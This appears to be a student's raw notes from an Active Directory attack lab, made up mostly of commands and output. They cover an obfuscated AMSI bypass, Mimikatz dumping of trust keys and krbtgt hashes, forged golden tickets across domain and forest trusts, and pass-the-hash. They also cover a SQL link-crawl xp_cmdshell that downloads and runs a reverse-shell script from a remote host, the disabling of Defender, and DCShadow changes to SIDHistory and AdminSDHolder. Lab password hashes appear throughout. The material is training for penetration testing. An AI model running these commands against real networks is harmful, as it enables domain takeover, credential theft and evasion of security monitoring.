+sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+exit 
+Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1 -Session $sess
+PS C:\AD\Tools> Enter-PSSession -Session $sess 
+[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\svcadmin\Documents> Invoke-Mimikatz -Command '"lsadump::trust /patch"'
+-----object from dollarcorp to moneycorp
+ MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
+    * 9/15/2019 9:03:44 PM - CLEAR   - bc e7 5f 8a 7b 4a e6 cd d7 24 cb b0 7a 3a d5 c8 42 83 e0 c3 9c 86 45 75 17 ef 4d 83 ce 25 2d fc 1c 7a 0d f8 17 14 5d bf 4d 28 bd ab c2 e5 42 03 a3 49 74 d3 12 44 7a 44 e9 05 d7 ee 16 d3 0c 17 98 16 f7 36 28 ad 1b 14 77 a5 5b 99 e9 67 c9 0b 70 00 bc 0b bd c4 0b d7 c8 75 72 d3 45 ae ae 7f ee f5 80 77 a5 f0 d5 8c 7a b5 37 a6 cc ef aa 20 c5 d7 5f 11 6e 20 20 0d c4 b6 6b a5 f4 d7 ab 71 06 c7 08 9e 79 53 84 04 87 1b ab 6c 0d 28 83 16 35 29 b2 1b cb 28 68 06 55 c3 3a 90 cc 21 41 f7 51 c6 39 12 af e2 c7 6b 1c c4 7f df d1 5e 11 c4 4c 63 de 25 c5 a6 1c ca 9e b0 61 81 84 2c 15 01 95 eb b4 6b d0 c8 b7 f6 12 52 e7 a6 ae 37 f3 7f b0 af e0 b4 0d ee 2b 00 a4 06 91 14 6e 57 f7 fe c8 d1 d9 9d 42 9a ff 59 3e b6 ec 04 83 18 87 8a
+        * aes256_hmac       1142a9ded42ef8c580c11844843e1dd00fbfccdf9b6d05ec4ad7dbea4cddcf86
+        * aes128_hmac       263010c41d550eaeb12c3c867dd36850
+        * rc4_hmac_nt       45de763e5a0602359d16c3fc2601d39f
+------
+f052addf1d43f864a7d0c21cbce440c9
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /rc4:45de763e5a0602359d16c3fc2601d39f /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi"'
+
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /rc4:f052addf1d43f864a7d0c21cbce440c9 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi"'
+
+Next, create a TGS for a service (CIFS) in the parent domain (moneycorp.local): 
+ 
+PS C:\AD\Tools\kekeo_old> .\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local 
+Present the TGS to the target service: 
+
+> CIFS/mcorp-dc.moneycorp.local
+  * Ticket in file 'CIFS.mcorp-dc.moneycorp.local.kirbi'
+ 
+PS C:\AD\Tools\kekeo_old> .\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi 
+Now, try to access the target service – a success means escalation to the parent DA: 
+ 
+PS C:\AD\Tools\kekeo_old> ls \\mcorp-dc.moneycorp.local\c$ 
+
+
+Learning Objective 20
+• Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using dollarcorp's krbtgt hash.
+PS C:\AD\Tools> Enter-PSSession -Session $sess 
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' 
+User : krbtgt
+LM   :
+NTLM : ff46a9d8bd66c6efd77603da26796f35
+--
+PS C:\AD\Tools> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"' 
+PS C:\AD\Tools> Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'  
+gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local 
+-----------------------------------------
+Learning Objective 21
+ With DA privileges on dollarcorp.moneycorp.local, get access to SharedwithDCorp share on the DC of eurocorp.local forest.
+for DA :- powershell run as admin
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"' 
+PS C:\AD\Tools> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+------
+Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-1652071801-1423090587-98612180)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
+    * 9/17/2019 9:03:13 PM - CLEAR   - 04 02 f3 1b 36 e9 20 82 7d 58 20 cd 90 79 55 e3 f6 9f 83 55 af 2a 66 20 93 40 fb 70 11 57 77 63 b0 f7 3f 88 f4 83 e7 5c c4 f6 94 bd e1 fa 2e 23 5f 34 5f 74 09 68 a0 e7 53 dd 4b 5d 52 fe 89 22 2f 36 c2 33 0a 93 b6 29 f7 71 ea 45 51 f7 1a af 2e f8 6e 06 76 4f d4 40 25 b3 ed ec 51 33 e7 42 72 24 77 33 af 22 3d ce 6b 15 11 d6 05 71 3e 9b c6 37 3d a9 35 ad 37 d7 5b ee 35 53 83 f8 af 0f 35 c4 81 88 2c f1 52 6f 38 46 0f 0b 1d 29 46 b8 4f da 56 1d 1b ff 48 bb 81 19 ca 8c e4 f3 02 82 6b 4a bd cf ec 06 30 84 98 0e 81 25 0f 7e 11 33 3b 8e 05 80 1b a4 d1 4c aa 9a 45 44 de b5 04 33 be ae f8 88 c3 18 37 8c 52 77 2e 34 c1 a2 94 ca b7 fe af d2 a9 d0 75 74 af 9e d3 2d d9 64 a4 44 04 66 09 13 d1 35 ee 58 31 ff 8a 69 e8 a1 16 99
+        * aes256_hmac       5b53c31a4ae6c40f84072edc39e81ab38fb219a7007380b92f8ba8a7d2209963
+        * aes128_hmac       ba71a4db01906e594a24302574450c6e
+        * rc4_hmac_nt       d94cdfd50b145f89134e548d4f431d11
+
+------
+Create the inter-realm TGT: 
+PS C:\AD\Tools> Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:d94cdfd50b145f89134e548d4f431d11 /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi"' 
+Get a TGS for a service (CIFS) in the target forest (eurocorp.local): 
+PS C:\AD\Tools\kekeo_old> .\asktgs.exe C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local 
+
+Present the TGS to the service (CIFS) in the target forest (eurocorp.local): 
+PS C:\AD\Tools\kekeo_old> .\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi 
+PS C:\AD\Tools\kekeo_old> ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\ 
+PS C:\AD\Tools\kekeo_old> cat \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt 
+Invoke-Command -ScriptBlock{whoami;hostname} -computername eurocorp-dc.eurocorp.local
+Learning Objective 22
+• Get a reverse shell on a SQL server in eurocorp forest by abusing database links from dcorp-mssql.
+Let’s start with enumerating SQL servers in the domain and if studentx has privileges to connect to any of them. We can use PowerUpSQL module for that:
+
+PS C:\AD\Tools\PowerUpSQL-master> Import-Module .\PowerupSQL.psd1 
+PS C:\AD\Tools\PowerUpSQL-master> Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
+ we can connect to dcorp-mssql. Using HeidiSQL client, let’s login to dcorp-mssql using windows authentication of studentx. 
+After login, enumerate linked databases on dcorp-mssql: 
+
+select * from master..sysservers 
+select * from openquery("DCORP-SQL1",'select * from master..sysservers') 
+select * from openquery("DCORP-SQL1",'select * from openquery("DCORP-MGMT",''select * from master..sysservers'')') 
+or
+PS C:\AD\Tools\PowerUpSQL-master> Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
+
+PS C:\AD\Tools\PowerUpSQL-master> Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local  -Query "exec master..xp_cmdshell 'whoami'" 
+
+
+PS C:\AD\Tools> . .\powercat.ps1 
+PS C:\AD\Tools> powercat -l -p 443 -v -t 1000 
+
+PS C:\AD\Tools\PowerUpSQL-master\PowerUpSQL-master> Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell "powershell.exe -c (iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.107/Invoke-PowerShellTcp.ps1''))"'
+
+PS C:\Windows\system32> whoami nt service\mssqlserver
+PS C:\Windows\system32> hostname eu-sql 
+
+
+Learning Objective 23
+• Use DCShadow to set a SPN for rootxuser.
+After logging in as moneycorp.local domain
+PS C:\Windows\system32> Set-MpPreference -DisableRealtimeMonitoring $true 
+open mimikatz.exe as admin
+mimikatz # !+ 
+mimikatz # !processtoken
+ mimikatz # lsadump::dcshadow /object:root107user /attribute:servicePrincipalName /value:"DCReplication/DC107" 
+
+In other mimikatz run as DA of moneycorp.local use the hash in ex 19.
+mimikatz # privilege::debug
+mimikatz # sekurlsa::pth /user:Administrator /domain:moneycorp.local /ntlm:71d04f9d50ceb1f64de7a09f23e6dc4c /impersonate 
+mimikatz # lsadump::dcshadow /push 
+• Using DCShadow, set rootxuser's SIDHistory without using DA.
+run powershelll with da first
+PS C:\WINDOWS\system32> Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:moneycorp.local /ntlm:71d04f9d50ceb1f64de7a09f23e6dc4c /run:powershell.exe"' 
+Run the below command from the PowerShell session running as DA: 
+PS C:\WINDOWS\system32> . C:\AD\Tools\Set-DCShadowPermissions.ps1 
+PS C:\AD\Tools> Set-DCShadowPermissions -FakeDC mcorp-student107 -SAMAccountName root107user -Username student107 -Verbose 
+-
+From system admin mimikatz.exe 
+mimikatz # lsadump::dcshadow /object:root107User /attribute:SIDHistory /value:S-1-5-21-280534878-1496970234-700767426-519
+From another system admin mimikatz.exe
+mimikatz # lsadump::dcshadow /push  
+
+• Modify the permissions of AdminSDHolder container using DCShadow and add Full Control permission for studentx.
+(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC =moneycorp,DC=local")).psbase.ObjectSecurity.sddl 
+
+(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC =moneycorp,DC=local")).psbase.ObjectSecurity.sddl | Set-Clipboard
+
+
+As visible above, a Full Control ACE is (A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;BA), we just need to replace BA with the SID of studentx. We can get the SID using PowerView: 
+
+PS C:\Users\privuser> Get-NetUser -UserName student107 | select objectsid 
+
+Now mimikatz as system admin exe one
+mimikatz #  lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:
+O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPLOCRRCWDWO;;;DA)(A;;CCDCLCSWRPWPLOCRRCWDWO;;;S-1-5-21-280534878-1496970234-700767426-519)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;WD)(OA;CI;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;PS)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;RPWP;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;RPWP;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;RPWP;bf967a7f-0de6-11d0-a285-00aa003049e2;;CA)(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-1874506631-3219952063-538504511-1601)
+Now, with DA privileges (or after modifying permissions), push the attributes: 
+mimikatz # lsadump::dcshadow /push 
+
+now if we list we can see full permision
+PS C:\Users> (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC =moneycorp,DC=local")).psbase.ObjectSecurity.sddl 
